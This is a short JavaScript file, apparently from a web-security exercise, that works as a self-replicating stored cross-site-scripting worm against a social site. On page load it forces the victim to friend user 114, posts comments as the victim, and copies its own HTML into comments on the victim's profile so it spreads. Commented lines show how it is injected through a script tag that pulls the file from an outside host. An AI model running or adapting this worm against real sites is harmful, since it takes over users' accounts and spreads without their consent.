$( document ).ready(function(){

    $.get("add_friend.php?id=114");
    $.ajax({url:"add_comment.php?id=114&comment="+ new Date()});
    $.get("home.php", function(data, status){
      var ln = data.search("id=");
      var ids = data.substr(ln, 6);
      var id = ids.match(/\d+/)[0];
			$.ajax({url:"add_comment.php?id="+id+"&comment="+encodeURI(document.getElementById("m").outerHTML)});
	});
});

//<script type="text/javascript" src="https://rawgit.com/JonLMyers/WebSecurity/master/Attack.js"></script>
//https://drive.google.com/host/0B_BwSrIRFmFza01yWEV3aWQ2eHM
